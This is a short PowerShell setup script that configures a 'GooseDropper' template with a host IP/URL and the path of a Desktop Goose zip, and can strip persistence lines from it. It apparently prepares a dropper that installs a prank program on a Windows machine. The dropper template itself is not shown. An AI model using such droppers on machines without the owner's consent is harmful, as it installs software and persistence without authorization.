param (
    [string]$HELP,
    [string]$IP,
    [string]$ZIP,
    [string]$PERSIST
)

# Ensure required arguments are not empty
if (-not $IP -or -not $ZIP) {
    Write-Host "Usage: .\windows_setup.ps1 <IP_Address/URL> <path_to_desktop_goose.zip> <persist y/n>"
    exit
}

# Check for help command
if ($HELP) {
    Write-Host "Usage: .\windows_setup.ps1 <IP_Address/URL> <path_to_desktop_goose.zip> <persist y/n>"
    exit
}

# Replace placeholders with provided values
(Get-Content "GooseDropper.txt") | ForEach-Object { $_ -replace 'YOUR_IP', $IP -replace 'ZIP', $ZIP } | Set-Content "GooseDropper.txt"

# Remove persistence if desired
if ($PERSIST.ToLower() -eq "n") {
    $lines = Get-Content "GooseDropper.txt"
    $lines = $lines[0..14] + $lines[19..($lines.Length - 1)]
    Set-Content "GooseDropper.txt" $lines
} else {
    break
}
